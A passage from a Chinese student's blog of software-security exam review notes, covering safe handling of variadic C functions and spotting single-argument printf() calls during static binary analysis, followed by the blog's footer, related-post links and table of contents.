class="line"><span class="keyword">if</span>(va_count-- == <span class="number">0</span>) <span class="built_in">abort</span>(); </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="type">int</span> av = <span class="number">-1</span>;</span><br><span class="line">av = average(<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">-1</span>); </span><br><span class="line">av = average(<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>#define va_start(ap,v)：va_start()宏被展开以初始化存储变参个数的变量va_count</li>
<li>(*(t *)((ap+&#x3D;_INTSIZEOF(t))-_INTSIZEOF(t)));:展开了va_arg()宏，每次<strong>调用它</strong>的时候变量va_count都会减1。</li>
<li>if(va_count– &#x3D;&#x3D; 0) abort()：当va_count等于零时如果再需要参数，则函数失败。当va_arg()函数用尽所有的参数时就非正常终止了。</li>
<li>av &#x3D; average(5, 6, 7, 8, -1)：<strong>works。</strong>第一次调用average()的时候，由于函数选用了<strong>参数为-1作为终止条件，所以执行成功。</strong></li>
<li>av &#x3D; average(5, 6, 7, 8)：<strong>fails。</strong>用户忘记将-1作为参数传给函数。</li>
</ul>
<p>（4）安全的变参函数绑定</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">av = average(<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>); <span class="comment">// fails</span></span><br><span class="line">push <span class="number">8</span></span><br><span class="line">push <span class="number">7</span></span><br><span class="line">push <span class="number">6</span></span><br><span class="line">push <span class="number">4</span> <span class="comment">// 4 var args (and 1 fixed)，包含变参个数的附加参数被插入到第4行</span></span><br><span class="line">push <span class="number">5</span> </span><br><span class="line">call average</span><br><span class="line">add esp, <span class="number">14</span>h</span><br><span class="line">mov dword ptr [av], eax</span><br><span class="line"><span class="comment">// 一个汇编语言指令的例子，这是第6行调用average()函数所需生成的指令，以便处理修改后的变参函数实现</span></span><br></pre></td></tr></table></figure>

<p>9.静态二进制分析</p>
<p>（1）printf()函数应该接受最少2个参数：一个格式化字符串和一个参数。如果printf()只有一个参数并且该参数可变，那么这个调用也许就表示有可利用的漏洞存在。</p>
<p>（2）传递给可变参数函数的参数个数<strong>可以通过检查函数的参数修正值进行确定。</strong>例如由于栈修正值是4，<strong>很明显只有一个参数被传递给了printf()。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2087.png" alt="image.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Harrisonls2004.github.io">Harrisonls2004</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://harrisonls2004.github.io/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/">https://harrisonls2004.github.io/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Harrisonls2004.github.io" target="_blank">lhldudu's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a><a class="post-meta__tags" href="/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">期末复习</a></div><div class="post-share"><div class="social-share" data-image="/img/softsec.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/25/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E5%A4%A7%E7%B1%BB%E8%AF%BE%E7%A8%8B%E4%BB%8B%E7%BB%8D/" title="北邮网安课程介绍（23级）"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/buptnew.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">北邮网安课程介绍（23级）</div></div><div class="info-2"><div class="info-item-1">前言由于培养方案还在不断更改，每一届的同学所学课程的顺序，需要选修的课程都有可能发生变化，以下为2023级培养方案相关课程，内容仅供参考。 博客上的资料为百度网盘链接，相关资料也可以在github仓库里找到：https://github.com/Harrisonls2004/BUPT-SCSS-2023 Tip: 如果链接过期请使用各种方式联系，我会在收到邮件的第一时间更新! 百度网盘链接已更新至每个科目后 BUPT-SCSS-2023相关资料汇总按照学期先后顺序排序，英语课、体育课、公选课在大三下后面。 大一上大一上的课比较少，难度也不是不大，多刷点题目基本就能拿高分。网安院分流只看第...</div></div></div></a><a class="pagination-related" href="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/" title="2025年度下半年总结"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/2025.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">2025年度下半年总结</div></div><div class="info-2"><div class="info-item-1">2025七八月感觉挺充实的暑假，六月开始准备一下软件杯。后来还培训了一下数学建模，又去了科研实习。      暑假去日本和杭州玩了一下，活过来了一点~    和枫哥一起去苏州软件杯比赛，顺便去苏州玩了会~ 九月 数学建模比赛，其实前期没有准备多少，也没怎么熬夜，后来拿了省二，还行吧~  陶喆演唱会~又能看演唱会了 十月  去天津逛了会~ 十一月  感谢好朋友陪我过21岁生日~第一次在海底捞过生日 十二月   好久没看到雪了~  然后就是期末月复习了 </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/" title="软件安全实验3：shellcode注入"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/softsec.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-06</div><div class="info-item-2">软件安全实验3：shellcode注入</div></div><div class="info-2"><div class="info-item-1">软件安全第三次实验报告实验目标1.了解shellcode注入原理 2.理解给出的弹出对话框的汇编代码 3.通过淹没静态地址来实现shellcode的代码植入 4.通过跳板来实现shellcode的代码植入 5.尝试修改汇编语句的shellcode实现修改标题等简单操作（1~5目标记作实验一） 6.在不修改StackOverrun程序源代码的情况下，构造shellcode，通过JMP ESP的方式实现通过记事本打开shellcode.txt（可实验CreateProcessA或WinExec等API）。（记作实验二） 实验一步骤与结果（一）创建可执行程序 1.进入虚拟机，打开shellco...</div></div></div></a><a class="pagination-related" href="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" title="Python期末复习"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/python.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-17</div><div class="info-item-2">Python期末复习</div></div><div class="info-2"><div class="info-item-1">授课: 尚煜茗 Python程序实例解析温度转换练习根据华氏和摄氏温度定义，转换公式如下：C &#x3D; ( F – 32 ) &#x2F; 1.8，F &#x3D; C * 1.8 + 32。其中，C表示摄氏温度，F表示华氏温度 123456789temp_str=input(&quot;请输入带符号温度值：&quot;)if temp_str[-1] in [&#x27;F&#x27;,&#x27;f&#x27;]:   C=(eval(temp_str[0:-1])-32)/1.8   print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.form...</div></div></div></a><a class="pagination-related" href="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/" title="软件安全实验5：虚函数攻击"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/softsec.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-27</div><div class="info-item-2">软件安全实验5：虚函数攻击</div></div><div class="info-2"><div class="info-item-1">软件安全第五次实验报告其实是第四次实验，但是老师给的名称叫实验五。 实验目标1.要求A (1)了解虚函数攻击的基本原理 (2)调试虚函数攻击代码，理解虚函数工作机制与内存分布方式，掌握基本的虚函数攻击与计算方式，并可以用OllyDbg&#x2F;x32Dbg&#x2F;IDA Pro追踪观察。 (3)我们已经将shellcode直接写成变量在程序中，通过修改虚函数表指针，指向我们伪造的虚函数表，运行我们的shellcode。(注意程序中的shellcode的某些函数地址，可能需要修改，可直接在程序运行时直接在内存中修改。或者直接修改main.cpp，重新编译)，如果你有自己编写shell...</div></div></div></a><a class="pagination-related" href="/2025/11/28/%E4%BA%91%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%86%8D%E5%BA%A6%E4%BA%AE%E7%BA%A2%E7%81%AF/" title="云基础软件安全再度亮红灯"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/soft2.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-28</div><div class="info-item-2">云基础软件安全再度亮红灯</div></div><div class="info-2"><div class="info-item-1">软件安全资讯作业新闻链接https://www.theregister.com/2025/11/24/fluent_bit_cves 资讯描述Fluent Bit在本周被披露存在多项高危漏洞，引发了云平台、DevOps团队与企业安全部门的广泛关注。作为开源日志采集和转发工具，Fluent Bit在许多企业的云原生架构、Kubernetes集群、监控系统甚至AI训练平台中扮演着关键角色。然而，此次披露的漏洞涉及认证绕过、路径遍历和可能的远程代码执行，使攻击者能够通过构造恶意日志数据获得异常权限，进而影响系统行为。 研究人员指出，这些漏洞中有相当一部分利用门槛极低，只需要向暴露的Fluent...</div></div></div></a><a class="pagination-related" href="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/" title="网络安全终极预测"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wlaq.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-29</div><div class="info-item-2">网络安全终极预测</div></div><div class="info-2"><div class="info-item-1">网络安全终极预测——LHL授课：郑康锋 填空题、选择题必背（红色历年考过的）1.信息安全保障的PDRR模型的内涵：保护、检测、响应、恢复。 2.攻击类型：阻断、截取、篡改、伪造 3.网络信息安全服务：机密性、完整性、可用性、可审性。 4.被动攻击：传输报文泄露、通信流量分析。 5.SQL注入基本流程：寻找注入点、信息采集、权限判断、攻击系统 6.DNS查询有两种：递归查询（客户机和服务器之间）、迭代查询（服务器之间）。 7.因特网的域名系统被设计成一个联机分布式数据库系统，并且采用分层树状结构的命名方法。 8.网络扫描分为以下三个步骤：发现目标主机或网络、进一步搜集目标信息（端口扫描、服...</div></div></div></a><a class="pagination-related" href="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" title="大数据安全期末复习"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/bdt.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-30</div><div class="info-item-2">大数据安全期末复习</div></div><div class="info-2"><div class="info-item-1">授课：石瑞生 绪论什么是大数据？（P1）（1）多样性(variety)：数据类型复杂。大数据不仅有传统数据库管理的结构化数据，还有各种非结构化、半结构化数据。例如，网页、图片、视频，等等。对于非结构化、半结构化数据的处理，需要引入传统关系型数据库技术之外的新的数据处理技术。 （2）高速性(velocity)：不仅数据量大，而且数据产生的速度快，对数据的实时处理能力提出了非常高的要求。例如，微博数据，不仅数量大，而且时效性高。如果按照传统的搜索引擎的模式去处理，花上几天甚至几周时间去做数据采集、建立索引，这些数据由于对时效性要求高（例如，新闻事件，应急事件，等），传统的数据处理方法在这种场...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Harrisonls2004</div><div class="author-info-description">尽人事 听天命</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Harrisonls2004/"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Harrisonls2004" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:lhldudu@bupt.edu.cn" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://qm.qq.com/q/1030824397" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #12b7f5;"></i></a><a class="social-icon" href="/img/wx.jpg" target="_blank" title="微信"><i class="fab fa-weixin" style="color: #09b83e;"></i></a><a class="social-icon" href="https://www.douyin.com/user/MS4wLjABAAAAn_2JnST2JJZLzTBjHHu28he2MZut6di0JkJcxc0-_uA?from_tab_name=main" target="_blank" title="抖音"><i class="fab fa-tiktok" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客！分享技术与生活感悟。有问题可以私信联系我，我会定期更新哒~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E8%AF%95%E5%BF%85%E5%A4%87%EF%BC%9A%E6%A6%82%E5%BF%B5%E9%A2%98-%E7%AE%80%E7%AD%94%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">考试必备：概念题&#x2F;简答题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text">名词解释题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E7%AD%94%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text">简答题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">软件安全基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80"><span class="toc-number">2.1.</span> <span class="toc-text">软件安全漏洞基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞利用技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞挖掘与模糊测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80"><span class="toc-number">3.</span> <span class="toc-text">缓冲区溢出基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">缓冲区溢出知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%A0%88%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">系统栈的工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%82%BB%E6%8E%A5%E5%8F%98%E9%87%8F%EF%BC%88%E5%AE%9E%E9%AA%8C%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">修改邻接变量（实验部分）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%89%E5%85%A8"><span class="toc-number">4.</span> <span class="toc-text">字符串安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E5%92%8C%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">4.1.</span> <span class="toc-text">背景和常见问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E9%94%99%E8%AF%AF"><span class="toc-number">4.2.</span> <span class="toc-text">常见的字符串操作错误</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%97%A0%E8%BE%B9%E7%95%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%8D%E5%88%B6"><span class="toc-number">4.2.1.</span> <span class="toc-text">1.无边界字符串复制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B7%AE%E4%B8%80%E9%94%99%E8%AF%AF"><span class="toc-number">4.2.2.</span> <span class="toc-text">2.差一错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%A9%BA%E7%BB%93%E5%B0%BE%E9%94%99%E8%AF%AF"><span class="toc-number">4.2.3.</span> <span class="toc-text">3.空结尾错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E6%96%AD"><span class="toc-number">4.2.4.</span> <span class="toc-text">4.字符串截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%95%B0%E7%BB%84%E5%86%99%E5%85%A5%E8%B6%8A%E7%95%8C"><span class="toc-number">4.2.5.</span> <span class="toc-text">5.数组写入越界</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text">字符串问题导致的安全漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">4.4.</span> <span class="toc-text">缓解措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E9%92%88%E5%AE%89%E5%85%A8"><span class="toc-number">5.</span> <span class="toc-text">指针安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E5%AE%89%E5%86%85%E5%AE%B9"><span class="toc-number">5.1.</span> <span class="toc-text">网安内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E5%AE%89%E8%A1%A5%E5%85%85%E8%A7%A3%E9%87%8A%E5%86%85%E5%AE%B9"><span class="toc-number">5.2.</span> <span class="toc-text">信安补充解释内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%AE%89%E5%85%A8"><span class="toc-number">6.</span> <span class="toc-text">动态内存安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-number">6.1.</span> <span class="toc-text">动态内存管理概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E9%94%99%E8%AF%AF"><span class="toc-number">6.2.</span> <span class="toc-text">常见的内存管理错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dlmalloc"><span class="toc-number">6.3.</span> <span class="toc-text">dlmalloc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RTL%E5%A0%86"><span class="toc-number">6.4.</span> <span class="toc-text">RTL堆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E7%AD%96%E7%95%A5"><span class="toc-number">6.5.</span> <span class="toc-text">缓解策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8"><span class="toc-number">7.</span> <span class="toc-text">整数安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.1.</span> <span class="toc-text">整数数据类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E7%9A%84%E8%BD%AC%E6%8D%A2"><span class="toc-number">7.2.</span> <span class="toc-text">整数的转换</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E9%94%99%E8%AF%AF%E6%83%85%E5%BD%A2"><span class="toc-number">7.2.1.</span> <span class="toc-text">整数错误情形</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">7.3.</span> <span class="toc-text">整数的操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.4.</span> <span class="toc-text">整数的漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E7%AD%96%E7%95%A5-1"><span class="toc-number">7.5.</span> <span class="toc-text">缓解策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA"><span class="toc-number">8.</span> <span class="toc-text">格式化输出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">8.1.</span> <span class="toc-text">格式化输出相关知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E5%8F%82%E5%87%BD%E6%95%B0"><span class="toc-number">8.2.</span> <span class="toc-text">变参函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0"><span class="toc-number">8.3.</span> <span class="toc-text">格式化输出函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">8.4.</span> <span class="toc-text">对格式化输出函数的漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E9%9A%8F%E6%9C%BA%E5%8C%96"><span class="toc-number">8.5.</span> <span class="toc-text">栈随机化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E7%AD%96%E7%95%A5-2"><span class="toc-number">8.6.</span> <span class="toc-text">缓解策略</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/27/EvoCorps/" title="EvoCorps"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/logo1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="EvoCorps"/></a><div class="content"><a class="title" href="/2026/01/27/EvoCorps/" title="EvoCorps">EvoCorps</a><time datetime="2026-01-27T05:00:00.000Z" title="发表于 2026-01-27 13:00:00">2026-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E5%A4%A7%E7%B1%BB%E8%AF%BE%E7%A8%8B%E4%BB%8B%E7%BB%8D/" title="北邮网安课程介绍（23级）"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/buptnew.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="北邮网安课程介绍（23级）"/></a><div class="content"><a class="title" href="/2026/01/25/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E5%A4%A7%E7%B1%BB%E8%AF%BE%E7%A8%8B%E4%BB%8B%E7%BB%8D/" title="北邮网安课程介绍（23级）">北邮网安课程介绍（23级）</a><time datetime="2026-01-25T11:48:17.000Z" title="发表于 2026-01-25 19:48:17">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/" title="软件安全期末复习"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/softsec.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="软件安全期末复习"/></a><div class="content"><a class="title" href="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/" 